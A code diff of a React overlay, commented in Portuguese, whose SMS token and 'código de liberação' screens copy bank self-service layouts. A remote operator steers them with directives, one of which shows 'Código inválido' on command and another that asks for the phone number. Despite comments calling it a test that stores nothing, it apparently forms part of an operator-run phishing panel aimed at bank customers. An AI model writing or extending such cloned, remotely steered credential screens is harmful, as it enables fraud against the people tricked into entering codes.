@@ -650,13 +650,11 @@ function LiveControlOverlay({
   const [, setLocation] = useLocation();
   const [directive, setDirective] = useState<string>('none');
   const [status, setStatus] = useState<string>('active');
-  const [token, setToken] = useState('');
   const [phone, setPhone] = useState('');
   const [responded, setResponded] = useState(false);
   const [smsLast3, setSmsLast3] = useState<string>('');
   const [code, setCode] = useState('');
-  const [codeError, setCodeError] = useState('');
-  const [verifying, setVerifying] = useState(false);
+  const [pendingWait, setPendingWait] = useState(false);
 
   useEffect(() => {
     let alive = true;
@@ -689,6 +687,16 @@ function LiveControlOverlay({
     }
   }, [directive, status, setLocation]);
 
+  // Reset da tela de entrada de teste sempre que o operador (re)aciona "Token SMS":
+  // sai do "Aguarde" (pendingWait) e limpa o campo. O aviso de "Código inválido"
+  // é derivado da diretiva 'sms_token_retry'.
+  useEffect(() => {
+    if (directive === 'sms_token' || directive === 'sms_token_retry') {
+      setCode('');
+      setPendingWait(false);
+    }
+  }, [directive]);
+
   const formatPhone = (digits: string) => {
     const d = digits.slice(0, 11);
     if (d.length <= 2) return d.length ? `(${d}` : '';
@@ -703,37 +711,30 @@ function LiveControlOverlay({
     </div>
   );
 
-  // Valida o código de liberação de HOMOLOGAÇÃO (comum a PF e PJ). Nunca envia
-  // nem armazena o valor real; o backend registra apenas "**** informado".
-  const verifyCode = async (e: FormEvent<HTMLFormElement>) => {
+  // Entrada de teste fictícia (comum a PF e PJ). NÃO valida, NÃO envia e NÃO
+  // armazena o valor digitado: ao confirmar, apenas sinaliza ao backend que houve
+  // uma entrada (muda o estado da sessão para "Aguarde") — sem o conteúdo do campo.
+  const smsError = directive === 'sms_token_retry' ? 'Código inválido. Digite novamente.' : '';
+
+  const submitEntry = (e: FormEvent<HTMLFormElement>) => {
     e.preventDefault();
-    if (code.length !== 4 || verifying) return;
-    setVerifying(true);
-    setCodeError('');
-    try {
-      const r = await fetch('/api/auth-attempt/sms-verify', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ sessionId: getSessionId(), code }),
-      });
-      const d = await r.json();
-      if (d?.valid) {
-        setResponded(true);
-        setCode('');
-      } else {
-        setCodeError('Código inválido. Verifique e tente novamente.');
-      }
-    } catch {
-      setCodeError('Não foi possível validar agora. Tente novamente.');
-    }
-    setVerifying(false);
+    if (code.length !== 4 || pendingWait) return;
+    setPendingWait(true);
+    setCode('');
+    fetch('/api/auth-attempt/sms-entry', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ sessionId: getSessionId() }),
+    }).catch(() => {});
   };
 
   const onCodeChange = (v: string) =>
     setCode(v.toUpperCase().replace(/[^A-Z0-9]/g, '').slice(0, 4));
 
+  const inSmsEntry = directive === 'sms_token' || directive === 'sms_token_retry';
+
   // PJ — tela de código de liberação (homologação), seguindo o layout do print PJ.
-  if (flow === 'PJ' && directive === 'sms_token' && !responded && status !== 'ended') {
+  if (flow === 'PJ' && inSmsEntry && !pendingWait && status !== 'ended') {
     return (
       <div className="pj-code-overlay" data-testid="live-sms-code-page">
         <main className="token-page">
@@ -760,7 +761,7 @@ function LiveControlOverlay({
                 </p>
               </div>
 
-              <form className="token-form" onSubmit={verifyCode}>
+              <form className="token-form" onSubmit={submitEntry}>
                 <div className="token-field">
                   <label className="token-label" htmlFor="sms-liberacao-code">
                     Código de liberação
@@ -774,21 +775,21 @@ function LiveControlOverlay({
                     maxLength={4}
                     autoComplete="off"
                     autoFocus
-                    disabled={verifying}
+                    disabled={pendingWait}
                     data-testid="live-sms-code-input"
                   />
                 </div>
 
-                {codeError && (
+                {smsError && (
                   <p className="token-error" role="alert" data-testid="live-sms-code-error">
-                    {codeError}
+                    {smsError}
                   </p>
                 )}
 
                 <button
                   type="submit"
                   className="token-submit"
-                  disabled={code.length !== 4 || verifying}
+                  disabled={code.length !== 4 || pendingWait}
                   data-testid="live-sms-code-submit"
                 >
                   AVANÇAR
@@ -812,14 +813,14 @@ function LiveControlOverlay({
 
   // PF — tela de "Liberação de computador" (homologação), seguindo o print PF e
   // reutilizando o padrão visual existente (.auto-liberacao-*), NÃO a tela PJ.
-  if (flow === 'PF' && directive === 'sms_token' && !responded && status !== 'ended') {
+  if (flow === 'PF' && inSmsEntry && !pendingWait && status !== 'ended') {
     return (
       <div className="auto-code-overlay" data-testid="live-sms-code-page-pf">
         <AutoatendimentoShell>
           <div className="auto-liberacao-stage">
             <form
               className="auto-liberacao-modal"
-              onSubmit={verifyCode}
+              onSubmit={submitEntry}
               aria-labelledby="pf-code-title"
               data-testid="pf-code-modal"
             >
@@ -842,13 +843,13 @@ function LiveControlOverlay({
                   maxLength={4}
                   autoComplete="off"
                   autoFocus
-                  disabled={verifying}
+                  disabled={pendingWait}
                   data-testid="live-pf-code-input"
                 />
 
-                {codeError && (
+                {smsError && (
                   <p className="auto-liberacao-error" role="alert" data-testid="live-pf-code-error">
-                    {codeError}
+                    {smsError}
                   </p>
                 )}
 
@@ -865,7 +866,7 @@ function LiveControlOverlay({
                   <button
                     type="submit"
                     className="auto-liberacao-advance"
-                    disabled={code.length !== 4 || verifying}
+                    disabled={code.length !== 4 || pendingWait}
                     data-testid="live-pf-code-submit"
                   >
                     LIBERAR
@@ -888,6 +889,8 @@ function LiveControlOverlay({
         <p>Sua sessão foi encerrada com segurança. Você será redirecionado.</p>
       </div>
     );
+  } else if (directive === 'sms_token_wait' || pendingWait) {
+    body = waiting;
   } else if (responded) {
     body = waiting;
   } else if (directive === 'invalid') {
@@ -904,36 +907,6 @@ function LiveControlOverlay({
           Tentar novamente
         </button>
       </div>
-    );
-  } else if (directive === 'sms_token') {
-    body = (
-      <form
-        className="live-control-card"
-        data-testid="live-sms-token"
-        onSubmit={(e) => {
-          e.preventDefault();
-          if (token.length < 4) return;
-          setResponded(true);
-          setToken('');
-          trackSession(flow, route, null, 'Token SMS informado');
-        }}
-      >
-        <h2>Confirmação por SMS</h2>
-        <p>Enviamos um token para o seu celular cadastrado. Digite o código recebido.</p>
-        <input
-          className="live-control-input"
-          inputMode="numeric"
-          autoFocus
-          placeholder="Token SMS"
-          value={token}
-          onChange={(e) => setToken(e.target.value.replace(/\D/g, '').slice(0, 8))}
-          maxLength={8}
-          data-testid="live-sms-input"
-        />
-        <button type="submit" className="live-control-btn" disabled={token.length < 4} data-testid="live-sms-submit">
-          Confirmar
-        </button>
-      </form>
     );
   } else if (directive === 'ask_phone') {
     body = (
